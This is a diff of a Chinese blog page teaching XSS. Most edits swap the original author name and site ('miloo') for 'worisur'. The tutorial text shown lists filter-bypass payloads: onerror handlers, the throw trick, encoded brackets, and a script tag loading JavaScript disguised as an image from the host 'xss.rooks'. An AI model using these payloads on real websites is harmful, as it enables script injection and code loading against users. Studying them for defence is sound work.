@@ -13,7 +13,7 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="miloo">
+  <meta name="author" content="worisur">
   <meta name="keywords" content="">
   
     <meta name="description" content="XSS原理、XSS编码……">
@@ -22,7 +22,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>经典漏洞-XSS - miloo&#39;s blog</title>
+  <title>经典漏洞-XSS - worisur&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -60,7 +60,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"imiloo.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"worisur.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -410,7 +410,7 @@
 <li>HTML编码&#x2F;解码</li>
 </ul>
 <p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。</p>
-<p>但是在HTML中有些字符是和关键词冲突的，比如&lt;、&gt;、&amp;，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&amp;nbsp;，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
+<p>但是在HTML中有些字符是和关键词冲突的，比如&lt;、&gt;、&amp;，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&nbsp;，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
 <table>
 <thead>
 <tr>
@@ -424,13 +424,13 @@
 <td>&lt;</td>
 <td>小于号</td>
 <td>&lt;</td>
-<td>&amp;#60;</td>
+<td>&#60;</td>
 </tr>
 <tr>
 <td>&gt;</td>
 <td>大于号</td>
 <td>&gt;</td>
-<td>&amp;#62;</td>
+<td>&#62;</td>
 </tr>
 </tbody></table>
 <p>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>
@@ -454,9 +454,9 @@
 
 <h4 id="3-2-1-6-将JS文件重命名为图像"><a href="#3-2-1-6-将JS文件重命名为图像" class="headerlink" title="3.2.1.6 将JS文件重命名为图像"></a>3.2.1.6 将JS文件重命名为图像</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure>
 
-<h3 id="3-2-2-过滤空格-x2F-引号"><a href="#3-2-2-过滤空格-x2F-引号" class="headerlink" title="3.2.2 过滤空格&#x2F;引号"></a>3.2.2 过滤空格&#x2F;引号</h3><h4 id="3-2-2-1-使用-x2F-代替"><a href="#3-2-2-1-使用-x2F-代替" class="headerlink" title="3.2.2.1 使用&#x2F;代替"></a>3.2.2.1 使用&#x2F;代替</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="3-2-2-过滤空格-引号"><a href="#3-2-2-过滤空格-引号" class="headerlink" title="3.2.2 过滤空格&#x2F;引号"></a>3.2.2 过滤空格&#x2F;引号</h3><h4 id="3-2-2-1-使用-代替"><a href="#3-2-2-1-使用-代替" class="headerlink" title="3.2.2.1 使用&#x2F;代替"></a>3.2.2.1 使用&#x2F;代替</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="3-2-3-过滤单-x2F-双引号"><a href="#3-2-3-过滤单-x2F-双引号" class="headerlink" title="3.2.3 过滤单&#x2F;双引号"></a>3.2.3 过滤单&#x2F;双引号</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用反引号代替<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>`<span class="hljs-attr">xss</span>`);&gt;</span><br># 编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="3-2-3-过滤单-双引号"><a href="#3-2-3-过滤单-双引号" class="headerlink" title="3.2.3 过滤单&#x2F;双引号"></a>3.2.3 过滤单&#x2F;双引号</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用反引号代替<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>`<span class="hljs-attr">xss</span>`);&gt;</span><br># 编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="3-2-4-过滤括号"><a href="#3-2-4-过滤括号" class="headerlink" title="3.2.4 过滤括号"></a>3.2.4 过滤括号</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"># 使用 throw 绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1337</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>&gt; onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。<br><br># 使用``代替<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># HTML编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="hljs-symbol">&amp;#x28;</span>1<span class="hljs-symbol">&amp;#x29;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -534,13 +534,13 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>经典漏洞-XSS</div>
-      <div>https://imiloo.github.io/2022/07/21/2022-07-21.经典漏洞-XSS/</div>
+      <div>https://worisur.github.io/2022/07/21/2022-07-21.经典漏洞-XSS/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>miloo</div>
+          <div>worisur</div>
         </div>
       
       
@@ -618,7 +618,7 @@
       window.UtterancesThemeDark = dark;
       var s = document.createElement('script');
       s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'imiloo/imiloo.github.io');
+      s.setAttribute('repo', 'worisur/worisur.github.io');
       s.setAttribute('issue-term', 'title');
       
       s.setAttribute('label', 'utterances');
